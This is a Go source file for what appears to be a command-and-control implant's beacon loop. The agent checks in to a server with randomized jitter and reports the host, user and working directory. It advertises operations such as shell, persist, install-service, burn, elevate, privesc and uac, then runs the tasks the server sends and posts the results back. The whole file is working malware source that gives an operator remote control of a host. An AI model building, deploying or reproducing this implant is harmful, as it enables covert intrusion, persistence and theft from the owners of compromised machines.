package runtime

import (
	"context"
	"log/slog"
	"math/rand/v2"
	"os"
	"os/user"
	"runtime"
	"strings"
	"time"

	"github.com/digitizables/lattice/agent/identity"
	"github.com/digitizables/lattice/agent/transport"
	agentv1 "github.com/digitizables/lattice/gen/lattice/agent/v1"
	"github.com/digitizables/lattice/internal/version"
)

// Capability / op advertisement for check-in (matches implemented builtins).
var (
	agentFeatures = []string{
		"shell", "ps", "fs", "download", "upload",
		"persist", "cleanup", "update", "elevate",
	}
	agentOps = []string{
		"whoami", "echo", "hostname", "pwd", "cd", "cwd",
		"shell", "run", "cmd", "powershell", "pwsh", "bash", "sh",
		"ps", "ls", "cat", "download", "upload",
		"persist", "install-service", "cleanup", "uninstall-all", "burn",
		"update", "elevate", "privesc", "uac",
	}
)

// Agent is the reference implant loop.
type Agent struct {
	ID            string
	Cwd           string // host working directory for shell commands
	Sleep         time.Duration
	Token         string // shared agent token (also on Transport)
	JitterPercent uint32 // 0-100; sleep *= (1 ± jitter%)
	Transport     *transport.HTTP
	Log           *slog.Logger
	IDFile        string // when set, persist server-assigned id across restarts
	ServerURL     string
	InsecureTLS   bool
	exitAfterTask bool
}

// Run check-ins until ctx is cancelled.
func (a *Agent) Run(ctx context.Context) error {
	if a.Log == nil {
		a.Log = slog.Default()
	}
	if a.Sleep <= 0 {
		a.Sleep = 5 * time.Second
	}
	if a.JitterPercent > 100 {
		a.JitterPercent = 100
	}
	a.ensureCwd()
	a.Log.Info("working directory", "cwd", a.Cwd)

	for {
		if err := a.beat(ctx); err != nil {
			a.Log.Warn("check-in failed", "err", err)
		}

		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(a.sleepWithJitter()):
		}
	}
}

// sleepWithJitter returns Sleep * (1 + random±JitterPercent%).
func (a *Agent) sleepWithJitter() time.Duration {
	base := a.Sleep
	if base <= 0 {
		base = 5 * time.Second
	}
	j := a.JitterPercent
	if j == 0 {
		return base
	}
	if j > 100 {
		j = 100
	}
	// Uniform integer offset in [-j, +j].
	delta := int32(rand.IntN(int(2*j+1))) - int32(j)
	d := time.Duration(float64(base) * (1 + float64(delta)/100))
	if d < 0 {
		return 0
	}
	return d
}

func (a *Agent) beat(ctx context.Context) error {
	hostname, _ := os.Hostname()
	username := ""
	if u, err := user.Current(); err == nil {
		username = accountName(u.Username, hostname)
	}

	a.ensureCwd()
	resp, err := a.Transport.CheckIn(ctx, &agentv1.AgentCheckIn{
		AgentId:       a.ID,
		Hostname:      hostname,
		Username:      username,
		Os:            runtime.GOOS,
		Arch:          runtime.GOARCH,
		SleepSeconds:  uint64(a.Sleep / time.Second),
		Cwd:           a.Cwd,
		Version:       version.Version,
		AgentToken:    a.Token,
		Features:      append([]string(nil), agentFeatures...),
		Ops:           append([]string(nil), agentOps...),
		JitterPercent: a.JitterPercent,
	})
	if err != nil {
		return err
	}
	if upd := resp.GetUpdate(); upd != nil && a.Log != nil {
		a.Log.Info("update available", "current", version.Version, "latest", upd.GetVersion())
	}
	if id := resp.GetAgentId(); id != "" {
		changed := id != a.ID
		a.ID = id
		if changed && a.IDFile != "" {
			if err := identity.Save(a.IDFile, a.ID); err != nil {
				a.Log.Warn("persist agent id failed", "path", a.IDFile, "err", err)
			} else {
				a.Log.Info("persisted agent id", "path", a.IDFile, "agent_id", a.ID)
			}
		}
	}
	if s := resp.GetSleepSeconds(); s > 0 {
		a.Sleep = time.Duration(s) * time.Second
		a.Log.Info("sleep updated from server", "sleep_seconds", s)
	}
	if resp.JitterPercent != nil {
		jp := *resp.JitterPercent
		if jp > 100 {
			jp = 100
		}
		a.JitterPercent = jp
		a.Log.Info("jitter updated from server", "jitter_percent", jp)
	}
	a.Log.Info("check-in ok", "agent_id", a.ID, "tasks", len(resp.GetTasks()))

	for _, t := range resp.GetTasks() {
		exitCode, stdout, stderr := a.runTask(ctx, t)
		a.ensureCwd()
		_, err := a.Transport.PostResult(ctx, &agentv1.AgentTaskResult{
			AgentId:  a.ID,
			TaskId:   t.GetTaskId(),
			ExitCode: exitCode,
			Stdout:   stdout,
			Stderr:   stderr,
			Cwd:      a.Cwd,
		})
		if err != nil {
			a.Log.Warn("post result failed", "task_id", t.GetTaskId(), "err", err)
		}
		if a.exitAfterTask {
			a.Log.Info("exiting after cleanup")
			os.Exit(0)
		}
	}
	return nil
}

// accountName strips HOST\ from Windows usernames when HOST matches the hostname.
func accountName(username, hostname string) string {
	i := strings.LastIndex(username, `\`)
	if i < 0 {
		return username
	}
	domain := username[:i]
	account := username[i+1:]
	if hostname != "" && strings.EqualFold(domain, hostname) {
		if account == "" {
			return username
		}
		return account
	}
	return username
}
